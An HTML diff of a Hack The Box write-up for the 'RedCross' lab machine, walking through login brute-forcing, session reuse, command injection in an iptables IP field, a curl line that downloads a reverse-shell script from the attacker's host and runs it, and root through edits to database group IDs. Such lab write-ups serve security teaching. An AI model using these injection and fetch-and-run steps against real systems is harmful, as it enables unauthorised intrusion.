@@ -79,47 +79,47 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as <code class="highlighter-rouge">www-data</code> , then escalate to root. The second way is to exploit a vulnerable <code class="highlighter-rouge">smtp</code> server called <code class="highlighter-rouge">Haraka</code> to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is <code class="highlighter-rouge">10.10.10.113</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">redcross.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/redcross/0.png" alt=""></p>
+<br><img src="/images/hackthebox/redcross/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with nmap to scan for open ports and services : 
-<code class="highlighter-rouge">nmap -sV -sT -sC redcross.htb</code>
-<img src="/images/hackthebox/redcross/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC redcross.htb</code>
+<br><img src="/images/hackthebox/redcross/1.png" alt=""><br>
 <br> Port 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http.
 <br></p>
 <hr>
 
 <h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
 <p><br> By going to <code class="highlighter-rouge">http://redcross.htb</code> it redirects us to <code class="highlighter-rouge">https://intra.redcross.htb</code>
-<img src="/images/hackthebox/redcross/2.png" alt="">
+<br><img src="/images/hackthebox/redcross/2.png" alt=""><br>
 <br> I added <code class="highlighter-rouge">intra.redcross.htb</code> to <code class="highlighter-rouge">/etc/hosts</code> next to the ip of the box which is <code class="highlighter-rouge">10.10.10.113</code>
-<img src="/images/hackthebox/redcross/3.png" alt="">
+<br><img src="/images/hackthebox/redcross/3.png" alt=""><br>
 <br> Let’s go to <code class="highlighter-rouge">intra.redcross.htb</code> again : 
-<img src="/images/hackthebox/redcross/4.png" alt="">
+<br><img src="/images/hackthebox/redcross/4.png" alt=""><br>
 <br> Before doing anything I wanted to see if there are any other subdomains , so I used <code class="highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt" target="_blank" rel="noopener noreferrer">subdomains-top1mil-5000.txt</a> from seclists :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST:FUZZ.redcross.htb" https://redcross.htb
 </code></pre></div></div>
-<p><img src="/images/hackthebox/redcross/5.png" alt="">
+<p><br><img src="/images/hackthebox/redcross/5.png" alt=""><br>
 <br> Responses for non-existing subdomains are 28 words so I stopped the scan to add <code class="highlighter-rouge">--hw 28</code> to filter these responses :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST:FUZZ.redcross.htb" https://redcross.htb
 </code></pre></div></div>
-<p><img src="/images/hackthebox/redcross/6.png" alt="">
+<p><br><img src="/images/hackthebox/redcross/6.png" alt=""><br>
 <br> And we got <code class="highlighter-rouge">admin.redcross.htb</code> , So I added it to <code class="highlighter-rouge">/etc/hosts</code> :
-<img src="/images/hackthebox/redcross/7.png" alt="">
+<br><img src="/images/hackthebox/redcross/7.png" alt=""><br>
 <br> Note : to enumerate every subdoamin there has to be an entry for that subdomain in <code class="highlighter-rouge">/etc/hosts</code> that points to the ip of the box , that’s why I added the <code class="highlighter-rouge">HOST</code> HTTP header (<code class="highlighter-rouge">-H "HOST:FUZZ.redcross.htb"</code>) , it solves the problem.
 <br> Now let’s go to <code class="highlighter-rouge">admin.redcross.htb</code> and see what’s there :
-<img src="/images/hackthebox/redcross/8.png" alt="">
+<br><img src="/images/hackthebox/redcross/8.png" alt=""><br>
 <br> It asks for login , we will get into this later but let’s go back to <code class="highlighter-rouge">intra.redcross.htb</code> and see what can we do from there.
-<img src="/images/hackthebox/redcross/4.png" alt="">
+<br><img src="/images/hackthebox/redcross/4.png" alt=""><br>
 <br> We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with <code class="highlighter-rouge">burp</code> to see the parameters :
-<img src="/images/hackthebox/redcross/9.png" alt="">
+<br><img src="/images/hackthebox/redcross/9.png" alt=""><br>
 <br> Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like <code class="highlighter-rouge">admin:admin</code>, <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt" target="_blank" rel="noopener noreferrer">top-usernames-shortlist.txt</a> from seclists :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hh 11 -u "https://intra.redcross.htb/pages/actions.php" -X POST -d "user=FUZZ&amp;pass=FUZZ&amp;action=login" -w top-usernames-shortlist.txt
 </code></pre></div></div>
-<p><img src="/images/hackthebox/redcross/10.png" alt="">
+<p><br><img src="/images/hackthebox/redcross/10.png" alt=""><br>
 <br> <code class="highlighter-rouge">guest:guest</code> gave us a different response. Let’s try it :
-<img src="/images/hackthebox/redcross/11.png" alt="">
+<br><img src="/images/hackthebox/redcross/11.png" alt=""><br>
 <br> And it worked. And we see this message :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From: admin (uid 1)	To: guest (uid 5)
 
@@ -131,36 +131,28 @@ You're granted with a low privilege access while we're processing your credentia
 
 <h2 id="broken-session-management--admin-panel">Broken Session Management , Admin Panel</h2>
 <p><br> After some enumeration I found that after being authenticated as <code class="highlighter-rouge">guest</code> on <code class="highlighter-rouge">intra.redcross.htb</code> you can use the session id on <code class="highlighter-rouge">admin.redcross.htb</code> and it will work :
-<img src="/images/hackthebox/redcross/12.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/13.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/14.png" alt="">
+<br><img src="/images/hackthebox/redcross/12.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/13.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/14.png" alt=""><br>
 <br> Now we have access to the admin panel , there are two areas : <code class="highlighter-rouge">User Management</code> and <code class="highlighter-rouge">Network Access</code>
 <br> <code class="highlighter-rouge">User Management</code> :
-<img src="/images/hackthebox/redcross/15.png" alt="">
+<br><img src="/images/hackthebox/redcross/15.png" alt=""><br>
 <br> Can we really add users ? Let’s try <code class="highlighter-rouge">test</code> :
-<img src="/images/hackthebox/redcross/16.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/17.png" alt="">
+<br><img src="/images/hackthebox/redcross/16.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/17.png" alt=""><br>
 <br> Nice it gave us the credentials , let’s try ssh : 
-<img src="/images/hackthebox/redcross/18.png" alt="">
+<br><img src="/images/hackthebox/redcross/18.png" alt=""><br>
 <br> And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at <code class="highlighter-rouge">/home</code> :
-<img src="/images/hackthebox/redcross/19.png" alt="">
+<br><img src="/images/hackthebox/redcross/19.png" alt=""><br>
 <br> <code class="highlighter-rouge">interface_data</code> and <code class="highlighter-rouge">public</code> ? Last thing I checked was <code class="highlighter-rouge">/etc/passwd</code> to know any possible user :
-<img src="/images/hackthebox/redcross/20.png" alt="">
+<br><img src="/images/hackthebox/redcross/20.png" alt=""><br>
 <br> There’s a user called <code class="highlighter-rouge">penelope</code> , but no <code class="highlighter-rouge">/home</code> directory for <code class="highlighter-rouge">penelope</code>. So I gave up on this and looked at <code class="highlighter-rouge">Network Access</code> :
-<img src="/images/hackthebox/redcross/21.png" alt="">
+<br><img src="/images/hackthebox/redcross/21.png" alt=""><br>
 <br> I added my ip address to the whitelist:
-<img src="/images/hackthebox/redcross/22.png" alt="">
+<br><img src="/images/hackthebox/redcross/22.png" alt=""><br>
 <br> Then I scanned the box with nmap again to see if some new ports show up :
-<img src="/images/hackthebox/redcross/59.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/60.png" alt="">
+<br><img src="/images/hackthebox/redcross/59.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/60.png" alt=""><br>
 <br> there’s ftp on port 21 (anonymous login not allowed), <code class="highlighter-rouge">postgresql SQL database</code> on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first.
 <br></p>
 <hr>
@@ -168,124 +160,112 @@ You're granted with a low privilege access while we're processing your credentia
 <h2 id="rce-on-adminredcrosshtb--reverse-shell-as-www-data">RCE on <code class="highlighter-rouge">admin.redcross.htb</code> , Reverse Shell as <code class="highlighter-rouge">www-data</code>
 </h2>
 <p><br> On the <code class="highlighter-rouge">Network Access</code> Section you can add and remove ips from the whitelist , I added a random ip , let’s say <code class="highlighter-rouge">11.11.11.11</code> and intercepted the two requests with <code class="highlighter-rouge">burp</code> :
-<img src="/images/hackthebox/redcross/23.png" alt="">
+<br><img src="/images/hackthebox/redcross/23.png" alt=""><br>
 <br> Allow request :
-<img src="/images/hackthebox/redcross/24.png" alt="">
+<br><img src="/images/hackthebox/redcross/24.png" alt=""><br>
 <br> Response :
-<img src="/images/hackthebox/redcross/25.png" alt="">
+<br><img src="/images/hackthebox/redcross/25.png" alt=""><br>
 <br> Deny request :
-<img src="/images/hackthebox/redcross/26.png" alt="">
+<br><img src="/images/hackthebox/redcross/26.png" alt=""><br>
 <br> Response :
-<img src="/images/hackthebox/redcross/27.png" alt="">
+<br><img src="/images/hackthebox/redcross/27.png" alt=""><br>
 <br> We notice that it’s saying <code class="highlighter-rouge">Executing iptables</code> , so the ip we provide will be a part of a system command. I added <code class="highlighter-rouge">|ls</code> to the ip parameter in the deny request and got this response :
-<img src="/images/hackthebox/redcross/28.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/29.png" alt="">
+<br><img src="/images/hackthebox/redcross/28.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/29.png" alt=""><br>
 <br> Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it <code class="highlighter-rouge">shell.sh</code> :
-<img src="/images/hackthebox/redcross/30.png" alt="">
+<br><img src="/images/hackthebox/redcross/30.png" alt=""><br>
 <br> Then I hosted it on a python simple HTTP server , and downloaded it on the box : <code class="highlighter-rouge">curl http://10.10.xx.xx/shell.sh &gt; /tmp/shell.sh</code>
-<img src="/images/hackthebox/redcross/31.png" alt="">
+<br><img src="/images/hackthebox/redcross/31.png" alt=""><br>
 <br> Python Server :
-<img src="/images/hackthebox/redcross/32.png" alt="">
+<br><img src="/images/hackthebox/redcross/32.png" alt=""><br>
 <br> Let’s verify that the shell is on the box :
-<img src="/images/hackthebox/redcross/33.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/34.png" alt="">
+<br><img src="/images/hackthebox/redcross/33.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/34.png" alt=""><br>
 <br> Nice let’s execute :
 <code class="highlighter-rouge">bash /tmp/shell.sh</code>
-<img src="/images/hackthebox/redcross/35.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/36.png" alt="">
+<br><img src="/images/hackthebox/redcross/35.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/36.png" alt=""><br>
 <br> We got a shell as <code class="highlighter-rouge">www-data</code> :
-<img src="/images/hackthebox/redcross/37.png" alt="">
+<br><img src="/images/hackthebox/redcross/37.png" alt=""><br>
 <br> And we see in <code class="highlighter-rouge">/home</code> a directory for <code class="highlighter-rouge">penelope</code> , but we can’t read the user flag.
-<img src="/images/hackthebox/redcross/38.png" alt=""></p>
+<br><img src="/images/hackthebox/redcross/38.png" alt=""><br></p>
 <hr>
 
 <h2 id="hardcoded-postgresql-database-credentials--privilege-escalation-to-root">Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root</h2>
 <p><br> In the root directory of the web application , there’s an interseting <code class="highlighter-rouge">php</code> file called <code class="highlighter-rouge">actions.php</code>. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called <code class="highlighter-rouge">unixusrmgr</code> :
-<img src="/images/hackthebox/redcross/40.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if($action==='del'){
-        header('refresh:1;url=/?page=users');
-        $uid=$_POST['uid'];
-        $dbconn = pg_connect("host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;");
-        $result = pg_prepare($dbconn, "q1", "delete from passwd_table where uid = $1");
-        $result = pg_execute($dbconn, "q1", array($uid));
-        echo "User account deleted";
-}
+<br><img src="/images/hackthebox/redcross/40.png" alt=""><br></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nv">$action</span><span class="o">===</span><span class="s1">'del'</span><span class="p">){</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s1">'refresh:1;url=/?page=users'</span><span class="p">);</span>
+        <span class="nv">$uid</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">];</span>
+        <span class="nv">$dbconn</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">"host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;"</span><span class="p">);</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_prepare</span><span class="p">(</span><span class="nv">$dbconn</span><span class="p">,</span> <span class="s2">"q1"</span><span class="p">,</span> <span class="s2">"delete from passwd_table where uid = $1"</span><span class="p">);</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_execute</span><span class="p">(</span><span class="nv">$dbconn</span><span class="p">,</span> <span class="s2">"q1"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$uid</span><span class="p">));</span>
+        <span class="k">echo</span> <span class="s2">"User account deleted"</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 <p><br> We knew earlier that the database is <code class="highlighter-rouge">PostgreSQL</code> , let’s connect :
 <br> Some Cheatcheets for <code class="highlighter-rouge">PostgreSQL</code> : 
 <br> <a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546" target="_blank" rel="noopener noreferrer">Github</a>
 <br> <a href="http://www.postgresqltutorial.com/postgresql-cheat-sheet/" target="_blank" rel="noopener noreferrer">postgresqltutorial.com</a>
-<code class="highlighter-rouge">psql -h 127.0.0.1 -d unix -U unixusrmgr</code>
-<img src="/images/hackthebox/redcross/41.png" alt="">
+<br><code class="highlighter-rouge">psql -h 127.0.0.1 -d unix -U unixusrmgr</code>
+<br><img src="/images/hackthebox/redcross/41.png" alt=""><br>
 <br> <code class="highlighter-rouge">\dt</code> to list the tables :
-<img src="/images/hackthebox/redcross/42.png" alt="">
+<br><img src="/images/hackthebox/redcross/42.png" alt=""><br>
 <br> I did <code class="highlighter-rouge">select * from passwd_table;</code> and got some users with their password hashes and other info , so I went back to the admin panel and added a user called <code class="highlighter-rouge">rick</code> :
-<img src="/images/hackthebox/redcross/43.png" alt="">
+<br><img src="/images/hackthebox/redcross/43.png" alt=""><br>
 <br> Then I did <code class="highlighter-rouge">select * from passwd_table;</code> again :
-<img src="/images/hackthebox/redcross/44.png" alt="">
+<br><img src="/images/hackthebox/redcross/44.png" alt=""><br>
 <br> We notice that the <code class="highlighter-rouge">homedir</code> is set to <code class="highlighter-rouge">/var/jail/home</code> that’s why we can’t access the actual host with created users. Also the <code class="highlighter-rouge">gid</code> is set to <code class="highlighter-rouge">1001</code>. Let’s set that to <code class="highlighter-rouge">0</code> (root) :
-<code class="highlighter-rouge">update passwd_table set gid=0 where gid=1001;</code>
-<img src="/images/hackthebox/redcross/45.png" alt="">
+<br><code class="highlighter-rouge">update passwd_table set gid=0 where gid=1001;</code>
+<br><img src="/images/hackthebox/redcross/45.png" alt=""><br>
 <br> Now the <code class="highlighter-rouge">gid</code> is <code class="highlighter-rouge">0</code> : 
-<img src="/images/hackthebox/redcross/46.png" alt="">
+<br><img src="/images/hackthebox/redcross/46.png" alt=""><br>
 <br> Let’s also change the <code class="highlighter-rouge">homedir</code> :
-<code class="highlighter-rouge">update passwd_table set homedir='/home' where homedir='/var/jail/home';</code>
-<img src="/images/hackthebox/redcross/47.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/48.png" alt="">
+<br><code class="highlighter-rouge">update passwd_table set homedir='/home' where homedir='/var/jail/home';</code>
+<br><img src="/images/hackthebox/redcross/47.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/48.png" alt=""><br>
 <br> Let’s login with ssh again :
-<img src="/images/hackthebox/redcross/49.png" alt="">
+<br><img src="/images/hackthebox/redcross/49.png" alt=""><br>
 <br> by checking our <code class="highlighter-rouge">gid</code> : 
-<img src="/images/hackthebox/redcross/50.png" alt="">
+<br><img src="/images/hackthebox/redcross/50.png" alt=""><br>
 <br> It’s <code class="highlighter-rouge">root</code> , we still can’t read the flags :
-<img src="/images/hackthebox/redcross/51.png" alt="">
+<br><img src="/images/hackthebox/redcross/51.png" alt=""><br>
 <br> We can’t also <code class="highlighter-rouge">sudo</code> :
-<img src="/images/hackthebox/redcross/52.png" alt="">
+<br><img src="/images/hackthebox/redcross/52.png" alt=""><br>
 <br> Weird , I checked <code class="highlighter-rouge">/etc/sudoers</code> and saw this line :
-<img src="/images/hackthebox/redcross/53.png" alt="">
+<br><img src="/images/hackthebox/redcross/53.png" alt=""><br>
 <br> If we got the <code class="highlighter-rouge">gid</code> of the group <code class="highlighter-rouge">sudo</code> , we will be able to run sudo. 
-<code class="highlighter-rouge">cat /etc/group | grep sudo</code>
-<img src="/images/hackthebox/redcross/54.png" alt="">
+<br><code class="highlighter-rouge">cat /etc/group | grep sudo</code>
+<br><img src="/images/hackthebox/redcross/54.png" alt=""><br>
 <br> The <code class="highlighter-rouge">gid</code> is <code class="highlighter-rouge">27</code> , let’s return to the database and change our <code class="highlighter-rouge">gid</code> from <code class="highlighter-rouge">0</code> to <code class="highlighter-rouge">27</code> :
-<code class="highlighter-rouge">update passwd_table set gid=27 where gid=0;</code>
-<img src="/images/hackthebox/redcross/55.png" alt="">
+<br><code class="highlighter-rouge">update passwd_table set gid=27 where gid=0;</code>
+<br><img src="/images/hackthebox/redcross/55.png" alt=""><br>
 <br>
 <code class="highlighter-rouge">select * from passwd_table;</code>
-<img src="/images/hackthebox/redcross/56.png" alt="">
+<br><img src="/images/hackthebox/redcross/56.png" alt=""><br>
 <br> Great , let’s terminate our ssh connection and login again. We are now a member of <code class="highlighter-rouge">sudo</code> and we can run <code class="highlighter-rouge">sudo</code> , so <code class="highlighter-rouge">sudo su</code> will give us a root shell.
-<img src="/images/hackthebox/redcross/57.png" alt="">
+<br><img src="/images/hackthebox/redcross/57.png" alt=""><br>
 <br> Let’s read the user flag :
-<img src="/images/hackthebox/redcross/58.png" alt="">
+<br><img src="/images/hackthebox/redcross/58.png" alt=""><br>
 <br> Before reading the root flag let’s see how can we actually get a user shell as <code class="highlighter-rouge">penelope</code>
 <br></p>
 <hr>
 
 <h2 id="vulnerable-smtp-server-haraka">Vulnerable SMTP Server (Haraka)</h2>
 <p><br> Back to the admin panel , after whitelisting the ip and doing a second nmap scan :
-<img src="/images/hackthebox/redcross/59.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/60.png" alt="">
+<br><img src="/images/hackthebox/redcross/59.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/60.png" alt=""><br>
 <br> Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, <code class="highlighter-rouge">nc</code> , <code class="highlighter-rouge">telnet</code> , <code class="highlighter-rouge">ftp</code> etc…
 <br> Fortunately <code class="highlighter-rouge">ftp</code> gave me this banner :
-<img src="/images/hackthebox/redcross/61.png" alt="">
+<br><img src="/images/hackthebox/redcross/61.png" alt=""><br>
 <br> That version of the <code class="highlighter-rouge">SMTP</code> server is vulnerable to a command injection and there’s a metasploit module for it :
-<img src="/images/hackthebox/redcross/62.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/redcross/63.png" alt="">
+<br><img src="/images/hackthebox/redcross/62.png" alt=""><br>
+<br><img src="/images/hackthebox/redcross/63.png" alt=""><br>
 <br> That’s how to get a shell on the box without the RCE in the web application.
 <br> We can get a shell by typing <code class="highlighter-rouge">shell</code> , and we are <code class="highlighter-rouge">penelope</code> so we can read the user flag :
-<img src="/images/hackthebox/redcross/64.png" alt="">
+<br><img src="/images/hackthebox/redcross/64.png" alt=""><br>
 <br> After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag :
-<img src="/images/hackthebox/redcross/65.png" alt="">
+<br><img src="/images/hackthebox/redcross/65.png" alt=""><br>
 <br> And we owned root !
 <br>
 <br>
